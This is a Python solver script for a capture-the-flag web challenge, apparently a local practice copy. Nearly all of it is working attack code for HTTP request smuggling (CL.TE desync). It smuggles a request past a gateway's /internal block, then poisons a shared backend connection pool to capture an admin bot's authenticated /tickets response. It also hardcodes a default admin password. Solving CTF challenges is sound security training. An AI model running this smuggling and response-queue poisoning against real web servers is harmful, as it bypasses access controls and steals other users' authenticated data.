#!/usr/bin/env python3
"""Solver for the wreckit70 web challenge (local practice copy).

Both flags are obtained with HTTP request smuggling (CL.TE desync):

  * The gateway frames requests by Content-Length, while the Node backend
    (insecureHTTPParser) prefers Transfer-Encoding: chunked. Sending both
    lets us smuggle a second request that the gateway never inspects -- this
    bypasses the gateway's `/internal` block (flag part 1).
  * Because the backend connection pool has size 1 and the gateway preserves
    leftover responses, our smuggled response shifts the response queue by
    one. The admin bot keeps calling GET /tickets through the same pool, so
    its authenticated response ends up queued for the next request we make
    (flag part 2, from the admin's seeded ticket).

Usage:
    python3 solve.py [host:port]        # default 127.0.0.1:8443
    python3 solve.py --login            # part2 via admin password instead
"""
import http.client
import re
import socket
import sys
import time

DEFAULT_HOST, DEFAULT_PORT = "127.0.0.1", 8443
ADMIN_USER = "admin"
ADMIN_PASS = "relay-internal-only"  # docker-compose.yaml default
FLAG_RE = re.compile(r"WRECKIT70\{[^}]*\}")


def recv_response(sock: socket.socket, timeout: float = 5.0) -> bytes:
    data = b""
    sock.settimeout(timeout)
    try:
        while b"\r\n\r\n" not in data:
            chunk = sock.recv(4096)
            if not chunk:
                return data
            data += chunk
        head, _, rest = data.partition(b"\r\n\r\n")
        length = 0
        for line in head.split(b"\r\n")[1:]:
            if line.lower().startswith(b"content-length:"):
                length = int(line.split(b":", 1)[1].strip())
        while len(rest) < length:
            chunk = sock.recv(4096)
            if not chunk:
                break
            rest += chunk
        return head + b"\r\n\r\n" + rest[:length]
    except socket.timeout:
        return data


def smuggle(host: str, port: int, path: str) -> bytes:
    """Smuggle a complete GET <path> and return the leftover response."""
    smuggled = f"GET {path} HTTP/1.1\r\nHost: t\r\n\r\n".encode()
    body = b"0\r\n\r\n" + smuggled
    request = (
        b"POST /x HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n" + body
    )
    sock = socket.create_connection((host, port))
    sock.sendall(request)
    recv_response(sock)                                  # response to POST /x
    sock.sendall(b"GET / HTTP/1.1\r\nHost: t\r\n\r\n")   # steals leftover
    leftover = recv_response(sock)
    return sock, leftover


def flag_part1(host: str, port: int) -> tuple[socket.socket, str | None]:
    sock, leftover = smuggle(host, port, "/internal/flag-part1")
    match = FLAG_RE.search(leftover.decode(errors="replace"))
    return sock, (match.group(0) if match else None)


def steal_flag_part2(sock: socket.socket, host: str, port: int, known: str | None,
                     timeout: float = 35.0) -> str | None:
    """Poll the poisoned pool until the admin bot's /tickets response shows up."""
    # Give the admin bot (VISIT_INTERVAL_MS=15000) time to make a request and
    # swallow one stale pooled response; its authenticated response is then
    # queued for us.
    time.sleep(17.0)
    deadline = time.time() + timeout
    i = 0
    while time.time() < deadline:
        sock.sendall(f"GET /poll{i} HTTP/1.1\r\nHost: t\r\n\r\n".encode())
        text = recv_response(sock, timeout=4.0).decode(errors="replace")
        for candidate in FLAG_RE.findall(text):
            if candidate != known:
                return candidate
        i += 1
        time.sleep(2.0)
    return None


def login_flag_part2(host: str, port: int) -> str | None:
    conn = http.client.HTTPConnection(host, port, timeout=10)
    conn.request("POST", "/login", f"username={ADMIN_USER}&password={ADMIN_PASS}",
                 {"Content-Type": "application/x-www-form-urlencoded"})
    res = conn.getresponse()
    res.read()
    cookie = res.getheader("Set-Cookie", "").split(";")[0]
    conn.request("GET", "/tickets", headers={"Cookie": cookie})
    page = conn.getresponse().read().decode(errors="replace")
    conn.close()
    match = FLAG_RE.search(page)
    return match.group(0) if match else None


def main():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    target = args[0] if args else f"{DEFAULT_HOST}:{DEFAULT_PORT}"
    host, _, port = target.replace("http://", "").replace("https://", "").partition(":")
    host, port = host or DEFAULT_HOST, int(port or DEFAULT_PORT)

    if "--login" in sys.argv:
        part2 = login_flag_part2(host, port)
        sock, part1 = flag_part1(host, port)   # smuggling leaves the pool dirty
        sock.close()
    else:
        sock, part1 = flag_part1(host, port)
        print("[*] waiting for admin bot to hit the poisoned pool...")
        part2 = steal_flag_part2(sock, host, port, part1)
        sock.close()

    print("[part1 - smuggling]      ", part1)
    print("[part2 - queue desync]   ", part2)


if __name__ == "__main__":
    main()
